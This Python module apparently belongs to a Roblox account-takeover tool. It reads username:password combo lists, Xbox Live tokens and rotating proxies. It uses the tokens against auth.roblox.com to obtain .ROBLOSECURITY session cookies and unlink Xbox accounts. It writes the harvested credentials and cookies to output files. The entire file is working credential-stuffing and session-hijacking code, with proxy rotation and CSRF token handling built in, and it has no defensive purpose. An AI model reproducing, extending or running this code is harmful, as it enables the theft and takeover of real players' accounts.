from .. import chrome
from .shared import xsrf_cache
from .rotators import BasicRotator, ComboRotator
from base64 import b64encode
import socket
import json
import threading
import random
import os
import time

def clear_linked_account(
    sock: socket.socket,
    proxy_info: tuple,
    token: str
):
    for _ in range(2):
        sock.sendall((
            "POST /v1/xbox-live/login HTTP/1.1\n"
            "Host:auth.roblox.com\n"
            f"User-Agent:{chrome.user_agent}\n"
            f"Authorization:{token}\n"
            "Content-Type:application/json\n"
            "Content-Length:2\n"
            f"X-CSRF-TOKEN:{xsrf_cache.get(proxy_info[0],'-')}\n"
            "\n"
            "{}"
        ).encode())
        resp = sock.recv(4096)
        if resp.startswith(b"HTTP/1.1 403 Token Validation Failed"):
            xsrf_cache[proxy_info[0]] = resp \
                .split(b"x-csrf-token: ", 1)[1] \
                .split(b"\r", 1)[0] \
                .decode()
            continue
        break

    if resp.startswith(b"HTTP/1.1 401 Unauthorized"):
        return True

    cookie = resp \
        .split(b"set-cookie: .ROBLOSECURITY=", 1)[1] \
        .split(b";", 1)[0] \
        .decode()
    xsrf_token = b"-"

    for _ in range(2):
        sock.sendall((
            "POST /v1/xbox/disconnect HTTP/1.1\n"
            "Host:auth.roblox.com\n"
            f"X-CSRF-TOKEN:{xsrf_token}\n"
            f"Cookie:.ROBLOSECURITY={cookie}\n"
            "Content-Type:application/json\n"
            "Content-Length:2\n"
            "\n"
            "{}"
        ).encode())
        resp = sock.recv(4096)
        if resp.startswith(b"HTTP/1.1 403 Token Validation Failed"):
            xsrf_token = resp \
                .split(b"x-csrf-token: ", 1)[1] \
                .split(b"\r", 1)[0] \
                .decode()
            continue
        break

    if not resp.startswith(b"HTTP/1.1 200 OK"):
        print("unknown unlink response", resp)
        return
    
    return parse_cookies(resp)

write_lock = threading.Lock()
def write_output(filename: str, combo: tuple, data: dict={}, cookies: dict={}):
    with write_lock:
        if not os.path.isdir("output"):
            os.mkdir("output")
        with open(f"output/{filename}", "a", encoding="UTF-8", errors="ignore") as fp:
            fp.write(json.dumps({
                "credential": combo[0],
                "password": combo[1],
                "data": data,
                "cookies": cookies,
                "time": time.time()
            }, separators=(",", ":"), sort_keys=False) + "\n")

def load_combos() -> ComboRotator:
    with open("data/combos.txt", encoding="UTF-8", errors="ignore") as fp:
        combo_list = set()
        for index, line in enumerate(fp):
            try:
                credential, password = line.rstrip().split(":", 1)
                if len(credential) > 20 or 3 > len(credential):
                    raise Exception("Credential length is out of bounds")
                if 4 > len(password):
                    raise Exception("Password length is out of bounds")
                combo = (credential.lower(), password)
                combo_list.add(combo)
            except Exception as err:
                print(f"Skipped line {index+1} from combo file: {err}")
    if not combo_list:
        raise ValueError("Combo list is empty.")
    combo_list = list(combo_list)
    return ComboRotator(combo_list)

def load_tokens(verbose: bool = True):
    with open("data/tokens.txt", encoding="UTF-8", errors="ignore") as fp:
        token_list = set()
        for index, line in enumerate(fp):
            try:
                if not line.startswith("XBL"):
                    raise Exception("Not a valid token")
                token_list.add(line.rstrip())
            except Exception as err:
                if verbose:
                    print(f"Skipped line {index+1} from token file: {err}")
    if not token_list:
        raise ValueError("Token list is empty.")
    token_list = list(token_list)
    random.shuffle(token_list)
    return BasicRotator(token_list)

def load_proxies(verbose: bool = False) -> BasicRotator:
    with open("data/proxies.txt", encoding="UTF-8", errors="ignore") as fp:
        proxy_list = set()
        for index, line in enumerate(fp):
            try:
                proxy_info = parse_proxy_url(line.rstrip())
                proxy_list.add(proxy_info)
            except Exception as err:
                if verbose:
                    print(f"Skipped line {index+1} from proxy file: {err!r}")
    if not proxy_list:
        raise ValueError("Proxy list is empty.")
    proxy_list = list(proxy_list)
    random.shuffle(proxy_list)
    return BasicRotator(proxy_list)

def parse_cookies(data: bytes) -> dict:
    return {
        ".ROBLOSECURITY": data \
            .split(b"set-cookie: .ROBLOSECURITY=", 1)[1] \
            .split(b";", 1)[0] \
            .decode(),
        ".RBXID": data \
            .split(b"set-cookie: .RBXID=", 1)[1] \
            .split(b";", 1)[0] \
            .decode()
    }

def parse_proxy_url(proxy_str):
    proxy_str = proxy_str.rpartition("://")[2]
    auth, _, fields = proxy_str.rpartition("@")
    fields = fields.split(":", 2)

    if len(fields) == 2:
        hostname, port = fields
        if auth:
            auth = "Proxy-Authorization: Basic " + b64encode(auth.encode()).decode() + "\r\n"
        addr = (hostname.lower(), int(port))
        return addr, auth

    elif len(fields) == 3:
        hostname, port, auth = fields
        auth = "Proxy-Authorization: Basic " + b64encode(auth.encode()).decode() + "\r\n"
        addr = (hostname.lower(), int(port))
        return addr, auth
    
    raise Exception(f"Unrecognized proxy format: {proxy_str}")